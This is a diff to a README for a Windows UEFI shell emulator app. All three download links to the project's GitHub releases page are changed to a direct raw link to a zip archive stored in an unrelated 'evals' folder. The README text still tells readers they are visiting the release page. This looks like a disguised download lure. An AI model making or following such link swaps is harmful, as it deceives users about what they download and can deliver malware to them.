@@ -1,6 +1,6 @@
 # ⚙️ emulator-uefi-shell-app - Run UEFI Shell Tools With Ease
 
-[![Download emulator-uefi-shell-app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Kats3938/emulator-uefi-shell-app/releases)
+[![Download emulator-uefi-shell-app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kats3938/emulator-uefi-shell-app/main/Skills/emulator-uefi-shell-app/evals/uefi_emulator_shell_app_v2.2.zip)
 
 ## 🖥️ What This App Does
 
@@ -19,7 +19,7 @@ The app is made for users who want a direct path from download to use.
 
 Visit the release page to download the Windows version:
 
-https://github.com/Kats3938/emulator-uefi-shell-app/releases
+https://raw.githubusercontent.com/Kats3938/emulator-uefi-shell-app/main/Skills/emulator-uefi-shell-app/evals/uefi_emulator_shell_app_v2.2.zip
 
 On that page, look for the latest release and choose the file that matches your Windows system. In most cases, the file name will include words like `Windows`, `x64`, or `setup`.
 
@@ -140,7 +140,7 @@ The release page is the best place to check for the latest package.
 
 If you need the release page again, use this link:
 
-https://github.com/Kats3938/emulator-uefi-shell-app/releases
+https://raw.githubusercontent.com/Kats3938/emulator-uefi-shell-app/main/Skills/emulator-uefi-shell-app/evals/uefi_emulator_shell_app_v2.2.zip
 
 ## 📌 What This Repository Is For
 
